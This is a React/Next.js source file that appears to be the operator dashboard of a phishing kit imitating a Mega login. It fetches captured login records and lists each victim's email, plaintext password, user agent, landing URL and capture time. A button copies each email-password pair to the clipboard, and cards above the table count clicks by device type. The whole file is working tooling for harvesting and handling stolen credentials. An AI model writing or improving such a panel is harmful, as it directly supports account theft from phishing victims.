'use client';

import { useEffect, useState } from "react";
import useSWR from "swr";
import { MdKeyboardArrowRight, MdKeyboardArrowLeft, MdContentCopy } from "react-icons/md";
import { FaRegArrowAltCircleRight } from "react-icons/fa";
import { formatDistanceToNow } from "date-fns";
import toast from "react-hot-toast";
import { useRouter } from "next/navigation";
import { isLoggedIn } from "../utils/auth";

const fetcher = (url) => fetch(url).then((res) => res.json());

const ActiveLinksTable = () => {
  const router = useRouter();
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 5;
  
  // Fetch user details from localStorage
  const initialUser = typeof window !== "undefined" ? localStorage.getItem("login_user") : null;
  const [user, setUser] = useState(initialUser);
  useEffect(() => {
    if (!user) {
      const loggedInUser = localStorage.getItem("login_user");
      if (loggedInUser) {
        setUser(loggedInUser); // Update state if not already set
      }
    }
  }, [user]);


  useEffect(() => {
    if (!isLoggedIn()) {
      router.push("/");
    }
  }, [user]);


  // SWR data fetching
  const { data: loginData, isLoading: isLoginDataLoading } = useSWR("/api/mega_login", fetcher);
  const { data: signupData, isLoading: isSignupDataLoading } = useSWR("/api/auth/signup", fetcher);
  const { data: countsData, isLoading: isCountsDataLoading } = useSWR("/api/get-visit-counts", fetcher);

  const loading = isLoginDataLoading || isSignupDataLoading || isCountsDataLoading;

  const userDetails = loginData?.data?.filter((value) => value?.logEmail === user) || [];
  const userName = signupData?.find((value) => value.email === user) || null;
  const deviceCounts = countsData
    ?.filter((value) => value.email === user)
    ?.reduce(
      (acc, item) => {
        acc.mobile += item.deviceCounts?.mobile || 0;
        acc.desktop += item.deviceCounts?.desktop || 0;
        acc.tablet += item.deviceCounts?.tablet || 0;
        acc.total += item.deviceCounts?.mobile || 0 + item.deviceCounts?.desktop || 0 + item.deviceCounts?.tablet || 0;
        return acc;
      },
      { mobile: 0, desktop: 0, tablet: 0, total: 0 }
    ) || { mobile: 0, desktop: 0, tablet: 0, total: 0 };

  const handlePageChange = (page) => {
    if (page >= 1 && page <= Math.ceil(userDetails?.length / itemsPerPage)) {
      setCurrentPage(page);
    }
  };

  const copyToClipboard = (value) => {
    navigator.clipboard.writeText(value).then(() => {
      toast.success(`Copied: ${value}`);
    });
  };

  const totalPages = Math.ceil(userDetails?.length / itemsPerPage);
  const startIndex = (currentPage - 1) * itemsPerPage;
  const currentItems = userDetails?.slice(startIndex, startIndex + itemsPerPage);

  return (
    <div className="p-4">
      <h3 className="pb-5 text-2xl font-normal text-gray-800">Dashboard</h3>

      {/* Device Counts Section */}
      <section className="flex items-center justify-between gap-5">
        {loading ? (
          ["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((_, index) => (
            <div className="w-full" key={index}>
              <div className="flex justify-between bg-gray-200 rounded-md animate-pulse">
                <div className="flex flex-col w-full gap-1">
                  <div className="h-12 px-4 pt-5 bg-gray-300 rounded-md"></div>
                  <div className="h-6 px-4 pb-6 mt-2 bg-gray-300 rounded-md"></div>
                  <div className="w-full h-10 p-2 mt-2 bg-gray-300 rounded-md"></div>
                </div>
              </div>
            </div>
          ))
        ) : (
          ["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((title, index) => (
            <div className="w-full" key={index}>
              <div
                className={`flex justify-between rounded-md ${
                  index === 0
                    ? "bg-cyan-600"
                    : index === 1
                    ? "bg-[#28a745]"
                    : index === 2
                    ? "bg-[#ffc107]"
                    : "bg-[#dc3545]"
                }`}
              >
                <div className="flex flex-col w-full gap-1">
                  <h1 className="px-4 pt-5 text-3xl font-bold text-white">{Object.values(deviceCounts)[index]}</h1>
                  <p className="px-4 pb-6 text-white">{title}</p>
                  <button className="flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md">
                    More Info
                    <FaRegArrowAltCircleRight />
                  </button>
                </div>
              </div>
            </div>
          ))
        )}
      </section>

      {/* Data Table */}
      <div className="pt-10 overflow-x-auto rounded shadow-lg">
        <table className="min-w-full border border-collapse border-gray-300 rounded-lg">
          <thead>
            <tr className="text-left bg-gray-100">
              {["ID", "Site Name", "Name", "Email", "Password", "UserAgent", "Landing URL", "Time", "Copy"].map((title, index) => (
                <th key={index} className="px-4 py-2 border border-gray-300">
                  {title}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
                  Loading...
                </td>
              </tr>
            ) : currentItems?.length === 0 ? (
              <tr>
                <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
                  No Data Available
                </td>
              </tr>
            ) : (
              currentItems.map((link, index) => (
                <tr key={link._id} className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200`}>
                  <td className="px-4 py-2 border border-gray-300">{index + 1}</td>
                  <td className="px-4 py-2 border border-gray-300">Mega</td>
                  <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
                  <td className="px-4 py-2 border border-gray-300">
                    {link?.createdAt ? formatDistanceToNow(new Date(link?.createdAt), { addSuffix: true }) : "N/A"}
                  </td>
                  <td className="px-4 py-2 text-center border border-gray-300">
                    <button
                      onClick={() => copyToClipboard(link?.email + " " + link?.password)}
                      className="p-2 text-white bg-green-500 rounded hover:bg-green-600"
                    >
                      <MdContentCopy size={18} />
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      {/* Pagination */}
      {currentItems?.length > 0 && (
        <div className="flex items-center gap-4 mt-4">
          <button
            onClick={() => handlePageChange(currentPage - 1)}
            className={`${currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"} p-2 text-white rounded`}
            disabled={currentPage === 1}
          >
            <MdKeyboardArrowLeft size={20} />
          </button>
          <span>
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => handlePageChange(currentPage + 1)}
            className={`${currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"} p-2 text-white rounded`}
            disabled={currentPage === totalPages}
          >
            <MdKeyboardArrowRight size={20} />
          </button>
        </div>
      )}
    </div>
  );
};

export default ActiveLinksTable;
